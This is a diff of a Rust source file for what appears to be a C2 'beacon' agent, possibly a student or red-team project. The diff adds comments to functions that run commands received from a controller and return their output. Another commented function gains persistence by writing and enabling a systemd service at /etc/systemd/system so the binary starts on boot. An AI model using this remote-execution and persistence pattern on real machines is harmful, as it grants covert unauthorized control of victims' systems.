@@ -12,6 +12,7 @@ use std::{thread, time};
 use beacon_controller::models::actions::BeaconAction;
 use beacon_controller::models::actions::BeaconAction::{ExecuteCommand, FallAsleep};
 
+/// Global var with date of last communication with server
 thread_local!(static LAST_ENTRY : RefCell<DateTime<Local>> = RefCell::new(
     fs::read_to_string(TIME).unwrap_or_else(|_err| {
         println!("{}", Local::now());
@@ -19,7 +20,9 @@ thread_local!(static LAST_ENTRY : RefCell<DateTime<Local>> = RefCell::new(
     }).parse::<DateTime<Local>>().expect("failed to parse")
 ));
 
+/// Path to file with date of last communication with server
 static TIME: &str = "./emit";
+/// Path to service file which run this executable on boot
 static SERVICE: &str = "/etc/systemd/system/beacon_need.service";
 
 fn main() {
@@ -53,6 +56,7 @@ fn main() {
 //     }
 // }
 
+/// Main function of the beacon
 fn run() {
     //test varbiables
     //let mut is_operating_as_transmition_tower = true; //determined the running mode of the beacon
@@ -109,16 +113,19 @@ fn run() {
             break
         }
 
-        //durée du sleep
+        // On gère la fréquence d'activité du beacon
         thread::sleep(time_of_nap);
     }
 }
 
+/// Exec a command and return its output
 fn exec_command(mut cmd: Command) -> String {
     let output = cmd.output().expect("command failed to execute");
     String::from_utf8(output.stdout).unwrap()
 }
 
+/// Able this executable to run on boot
+/// For this we add and activate a new service
 fn exec_on_boot() {
     let exe = env::current_exe().expect("Failed to get current exe");
     let mut file = File::create(SERVICE).unwrap();
@@ -132,6 +139,7 @@ fn exec_on_boot() {
         .expect("systemctl failed to execute");
 }
 
+/// Update the global variable and file with date of last communication with server
 fn update_time() {
     LAST_ENTRY.with(|time| {
         *time.borrow_mut() = Local::now();
